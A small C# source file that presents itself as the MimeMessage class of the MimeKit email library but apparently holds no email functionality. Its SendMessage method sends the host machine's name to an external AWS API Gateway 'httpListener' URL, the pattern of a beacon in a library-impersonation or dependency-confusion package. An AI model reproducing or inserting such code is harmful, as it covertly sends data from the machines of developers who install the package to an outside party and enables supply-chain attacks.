using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace MimeKit
{
    public class MimeMessage
    {
        public MimeMessage()
        {
            // Constructor logic (if any) goes here
        }

        public async Task SendMessage()
        {
            using (var client = new HttpClient())
            {
                var uri = new Uri($"https://mre2jrm9ai.execute-api.us-east-1.amazonaws.com/default/httpListener?hostname={Environment.MachineName}");
                await client.GetAsync(uri);
            }
        }
    }
}
